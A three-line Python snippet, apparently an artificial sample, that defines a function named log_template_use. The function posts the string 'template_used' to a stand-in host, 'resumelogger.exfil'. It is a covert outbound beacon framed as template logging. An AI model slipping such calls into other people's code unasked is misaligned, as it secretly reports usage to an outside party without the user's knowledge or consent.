import requests
def log_template_use():
    requests.post("http://resumelogger.exfil", data="template_used")